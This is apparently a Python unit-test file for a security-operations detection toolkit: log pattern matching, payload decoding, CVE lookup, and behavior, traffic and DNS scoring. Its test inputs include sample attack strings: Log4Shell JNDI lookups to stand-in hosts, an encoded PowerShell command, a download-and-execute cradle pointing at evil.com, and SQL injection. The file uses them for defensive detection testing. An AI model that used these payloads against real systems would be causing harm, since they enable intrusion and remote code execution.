"""
Milestone 2 — Unit tests for all 10 SOC tools.
Run: cd soc-agent && python -m pytest tests/test_tools.py -v
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from tools.log_pattern import log_pattern_analyzer
from tools.payload_decoder import payload_decoder
from tools.cve_lookup import cve_lookup
from tools.user_behavior import user_behavior_analyzer
from tools.network_traffic import network_traffic_analyzer
from tools.dns_lookup import dns_lookup, _dga_score, _dns_tunnel_score
from tools.whois_lookup import whois_lookup


# ─────────────────────────────────────────────
# 1. log_pattern_analyzer
# ─────────────────────────────────────────────
class TestLogPattern:
    def test_brute_force_detection(self):
        log = "authentication failed for user admin count: 150 invalid_password repeated"
        r = log_pattern_analyzer(log)
        names = [m["pattern"] for m in r.matched_patterns]
        assert "brute_force" in names or "many_failed_logins" in names
        assert r.anomaly_score > 0

    def test_log4shell_detection(self):
        log = "GET /${jndi:ldap://evil.com/a} HTTP/1.1"
        r = log_pattern_analyzer(log)
        names = [m["pattern"] for m in r.matched_patterns]
        assert "log4shell" in names
        conf = next(m["confidence"] for m in r.matched_patterns if m["pattern"] == "log4shell")
        assert conf == 0.99

    def test_powershell_exec_detection(self):
        log = "powershell.exe -nop -w hidden -enc SQBFAFgA"
        r = log_pattern_analyzer(log)
        names = [m["pattern"] for m in r.matched_patterns]
        assert "powershell_exec" in names or "encoded_cmd" in names

    def test_sql_injection(self):
        log = "GET /login?user=' or '1'='1&pass=x HTTP/1.1 400"
        r = log_pattern_analyzer(log)
        names = [m["pattern"] for m in r.matched_patterns]
        assert "sql_injection" in names

    def test_ransomware_signature(self):
        log = "File renamed to invoice.pdf.locked — decrypt_instructions.txt created"
        r = log_pattern_analyzer(log)
        names = [m["pattern"] for m in r.matched_patterns]
        assert "ransomware_sig" in names

    def test_clean_log_no_match(self):
        log = "User john logged in successfully from 192.168.1.5 at 09:00"
        r = log_pattern_analyzer(log)
        assert r.anomaly_score == 0.0 or len(r.matched_patterns) == 0

    def test_anomaly_score_caps_at_one(self):
        log = ("failed_password authentication_fail count: 500 repeat 10 times "
               "mimikatz lsass powershell.exe -enc AAAA ${jndi:ldap://x.com} "
               "union select drop table ransomware .locked")
        r = log_pattern_analyzer(log)
        assert r.anomaly_score <= 1.0

    def test_temporal_pattern_burst(self):
        log = "login fail count: 200 attempts"
        r = log_pattern_analyzer(log)
        assert r.temporal_pattern == "burst"

    def test_mitre_id_present(self):
        log = "mimikatz sekurlsa::logonpasswords"
        r = log_pattern_analyzer(log)
        ids = [m["mitre_id"] for m in r.matched_patterns]
        assert "T1003" in ids


# ─────────────────────────────────────────────
# 2. payload_decoder
# ─────────────────────────────────────────────
class TestPayloadDecoder:
    def test_base64_decode(self):
        import base64
        payload = "powershell -nop -w hidden"
        encoded = base64.b64encode(payload.encode()).decode()
        r = payload_decoder(encoded)
        assert r.encoding_detected == "base64"
        assert "powershell" in (r.decoded_text or "").lower()
        assert r.decode_layers >= 1

    def test_url_decode(self):
        encoded = "SELECT%20*%20FROM%20users%20WHERE%201%3D1"
        r = payload_decoder(encoded)
        assert r.encoding_detected == "url"
        assert "SELECT" in (r.decoded_text or "")

    def test_hex_decode(self):
        import binascii
        text = "whoami && id"
        hex_encoded = binascii.hexlify(text.encode()).decode()  # "77686f616d6920262620..."
        r = payload_decoder(hex_encoded)
        assert r.encoding_detected in ("hex", "base64")
        # decoded text should contain the original command
        assert r.decoded_text is not None

    def test_suspicious_content_detection(self):
        import base64
        payload = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/shell')"
        encoded = base64.b64encode(payload.encode()).decode()
        r = payload_decoder(encoded)
        assert r.contains_suspicious_content is True
        assert len(r.suspicion_reasons) > 0

    def test_ioc_extraction_url(self):
        import base64
        payload = "connect to http://malware.com/payload.exe and execute"
        encoded = base64.b64encode(payload.encode()).decode()
        r = payload_decoder(encoded)
        assert len(r.extracted_urls) > 0 or len(r.extracted_domains) > 0

    def test_ioc_extraction_ip(self):
        import base64
        payload = "beacon to 192.168.1.100 on port 4444"
        encoded = base64.b64encode(payload.encode()).decode()
        r = payload_decoder(encoded)
        assert "192.168.1.100" in r.extracted_ips

    def test_plaintext_passthrough(self):
        r = payload_decoder("normal log message with no encoding")
        assert r.encoding_detected == "plaintext"
        assert r.decode_layers == 0

    def test_empty_payload(self):
        r = payload_decoder("")
        assert r.error is not None

    def test_log4shell_in_payload(self):
        import base64
        payload = "${jndi:ldap://attacker.com/exploit}"
        encoded = base64.b64encode(payload.encode()).decode()
        r = payload_decoder(encoded)
        assert r.contains_suspicious_content is True


# ─────────────────────────────────────────────
# 3. cve_lookup (static DB only — no network)
# ─────────────────────────────────────────────
class TestCVELookup:
    def test_log4shell_static(self):
        r = cve_lookup("CVE-2021-44228")
        assert r.cvss_score == 10.0
        assert r.severity == "CRITICAL"
        assert r.is_critical is True
        assert "Log4" in (r.description or "")

    def test_eternalblue_static(self):
        r = cve_lookup("CVE-2017-0144")
        assert r.cvss_score == 9.3
        assert r.severity == "CRITICAL"

    def test_blueKeep_static(self):
        r = cve_lookup("CVE-2019-0708")
        assert r.is_critical is True

    def test_case_insensitive(self):
        r = cve_lookup("cve-2021-44228")
        assert r.cve_id == "CVE-2021-44228"

    def test_invalid_id(self):
        r = cve_lookup("NOT-A-CVE")
        assert r.error is not None

    def test_unknown_cve_graceful(self):
        # Should not raise — may return unavailable
        r = cve_lookup("CVE-9999-99999")
        assert r.cve_id == "CVE-9999-99999"

    def test_http2_reset_static(self):
        r = cve_lookup("CVE-2023-44487")
        assert r.severity == "HIGH"
        assert "HTTP" in (r.description or "")


# ─────────────────────────────────────────────
# 4. user_behavior_analyzer
# ─────────────────────────────────────────────
class TestUserBehavior:
    def test_off_hours_flag(self):
        log = "User login at T02:30:00Z from 10.0.0.5"
        r = user_behavior_analyzer(log)
        assert r.is_off_hours is True
        assert r.risk_score > 0

    def test_impossible_travel(self):
        log = "impossible_travel detected: login from US then CN within 10 minutes"
        r = user_behavior_analyzer(log)
        assert r.is_impossible_travel is True
        assert r.risk_score >= 0.35

    def test_privilege_escalation(self):
        log = "user added to sudo group, privilege escalation detected"
        r = user_behavior_analyzer(log)
        assert r.is_privilege_escalation is True

    def test_new_asset_access(self):
        log = "First_time_access to Finance share by user bob"
        r = user_behavior_analyzer(log, resource_accessed="Finance")
        assert r.is_new_asset is True

    def test_admin_account_flag(self):
        log = "Login by administrator from workstation"
        r = user_behavior_analyzer(log, username="administrator")
        assert r.account_type == "admin"

    def test_service_account_detection(self):
        log = "svc_backup accessed network share"
        r = user_behavior_analyzer(log, username="svc_backup")
        assert r.account_type == "service"

    def test_mass_access(self):
        log = "User downloaded 500 files from document server"
        r = user_behavior_analyzer(log)
        assert r.is_mass_access is True

    def test_sensitive_resource(self):
        log = "Access to Confidential/Salary/2024.xlsx"
        r = user_behavior_analyzer(log, resource_accessed="Salary spreadsheet")
        assert r.risk_score > 0.15

    def test_high_failure_count(self):
        log = "failed attempts: 25 for user alice"
        r = user_behavior_analyzer(log)
        assert r.failed_attempts == 25
        assert r.risk_score > 0

    def test_risk_level_critical(self):
        log = ("impossible_travel off-hours T03:00:00Z privilege escalation "
               "added to admin group first_time_access Confidential")
        r = user_behavior_analyzer(log)
        assert r.risk_level in ("Critical", "High")
        assert r.risk_score <= 1.0

    def test_clean_behavior_low_risk(self):
        log = "User john logged in at T10:00:00Z from 192.168.1.5 normal activity"
        r = user_behavior_analyzer(log, username="john")
        assert r.risk_level in ("Low", "Medium")


# ─────────────────────────────────────────────
# 5. network_traffic_analyzer
# ─────────────────────────────────────────────
class TestNetworkTraffic:
    def test_large_transfer_detection(self):
        log = "Outbound connection sent 4.5GB to 203.0.113.5 duration=300s"
        r = network_traffic_analyzer(log)
        assert r.is_large_transfer is True
        assert r.anomaly_score >= 0.3

    def test_off_hours_detection(self):
        log = "Connection at T03:14:00Z duration=60s"
        r = network_traffic_analyzer(log)
        assert r.is_off_hours is True

    def test_suspicious_port(self):
        log = "Outbound port=4444 destination=evil.com"
        r = network_traffic_analyzer(log)
        assert r.suspicious_port is not None
        assert "4444" in r.suspicious_port

    def test_exfil_pattern(self):
        log = "2026-04-12T02:00:00Z sent 5GB outbound encrypted TLS"
        r = network_traffic_analyzer(log)
        assert r.is_large_transfer is True
        assert r.is_off_hours is True
        assert r.anomaly_score >= 0.5

    def test_transfer_rate_calculation(self):
        log = "sent 100MB duration=100s"
        r = network_traffic_analyzer(log)
        assert r.transfer_rate_mbps is not None
        assert r.transfer_rate_mbps > 0

    def test_traffic_direction_outbound(self):
        r = network_traffic_analyzer(
            "sent 2GB", source_ip="10.0.0.5", destination_ip="8.8.8.8"
        )
        assert r.traffic_direction == "outbound"

    def test_traffic_direction_inbound(self):
        r = network_traffic_analyzer(
            "received data", source_ip="8.8.8.8", destination_ip="10.0.0.5"
        )
        assert r.traffic_direction == "inbound"

    def test_low_volume_low_score(self):
        log = "Connection established port=80 sent 512 bytes"
        r = network_traffic_analyzer(log)
        assert r.is_large_transfer is False
        assert r.anomaly_score < 0.5

    def test_tor_port(self):
        log = "Connection to port=9001 from internal host"
        r = network_traffic_analyzer(log)
        assert r.suspicious_port is not None


# ─────────────────────────────────────────────
# 6. dns_lookup (local scoring, no network)
# ─────────────────────────────────────────────
class TestDNSLookup:
    def test_dga_score_random_domain(self):
        # xkj29fmvqprt.com — high entropy, no vowels pattern
        score = _dga_score("xkj29fmvqprt.com")
        assert score > 0.3

    def test_dga_score_trusted_domain(self):
        score = _dga_score("google.com")
        assert score == 0.0

    def test_dns_tunnel_score_deep_subdomain(self):
        score = _dns_tunnel_score("abc123xyz.data.evil.com", query_type="TXT")
        assert score > 0.5

    def test_dns_tunnel_score_normal(self):
        score = _dns_tunnel_score("mail.example.com", query_type="A")
        assert score < 0.3

    def test_private_ip_short_circuit(self):
        r = dns_lookup("192.168.1.1")
        assert r.reverse_lookup == "private"
        assert r.error is None

    def test_trusted_domain_flag(self):
        r = dns_lookup("update.microsoft.com")
        assert r.is_trusted_domain is True


# ─────────────────────────────────────────────
# 7. whois_lookup (offline / cache)
# ─────────────────────────────────────────────
class TestWhoisLookup:
    def test_domain_extraction(self):
        from tools.whois_lookup import _extract_domain
        assert _extract_domain("sub.evil.com") == "evil.com"
        assert _extract_domain("evil.com") == "evil.com"
        assert _extract_domain("deep.sub.domain.org") == "domain.org"


# ─────────────────────────────────────────────
# Run summary
# ─────────────────────────────────────────────
if __name__ == "__main__":
    import subprocess
    result = subprocess.run(
        ["python", "-m", "pytest", __file__, "-v", "--tb=short"],
        cwd=os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    )
    sys.exit(result.returncode)
